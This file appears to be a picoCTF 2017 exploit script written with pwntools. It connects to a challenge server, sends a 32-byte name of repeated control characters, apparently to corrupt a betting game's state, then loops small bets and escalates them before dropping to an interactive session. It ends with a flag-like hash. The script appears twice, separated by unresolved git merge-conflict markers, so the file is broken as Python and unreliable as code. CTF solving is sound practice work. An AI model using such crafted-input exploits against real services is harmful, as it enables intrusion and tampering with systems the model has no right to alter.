<<<<<<< HEAD
#! python 2
# coding=utf-8
from pwn import *

r=remote('shell2017.picoctf.com', 5206)
r.recvuntil('Please enter your name:')
r.sendline(chr(2)*32)
res=r.recvuntil('How much would you like to bet?\n')
r.sendline(str(1))
for _ in range(1000):
  res=r.recvuntil('How much would you like to bet?\n')
  r.sendline(str(1))
  print res
  if 'lost' not in res:
    break


now_coin=res.split('\n')[6].split(' ')[2]
print now_coin
r.sendline(str(49))
r.sendline(str(98))
r.sendline(str(196))
r.sendline(str(392))
r.interactive()

# 29f8f37fea1b5f816f887387e83f041e

=======
#! python 2
# coding=utf-8
from pwn import *

r=remote('shell2017.picoctf.com', 5206)
r.recvuntil('Please enter your name:')
r.sendline(chr(2)*32)
res=r.recvuntil('How much would you like to bet?\n')
r.sendline(str(1))
for _ in range(1000):
  res=r.recvuntil('How much would you like to bet?\n')
  r.sendline(str(1))
  print res
  if 'lost' not in res:
    break


now_coin=res.split('\n')[6].split(' ')[2]
print now_coin
r.sendline(str(49))
r.sendline(str(98))
r.sendline(str(196))
r.sendline(str(392))
r.interactive()

# 29f8f37fea1b5f816f887387e83f041e

>>>>>>> 7207c77a15e788c4cae534c3299ee5c86a16c4f7
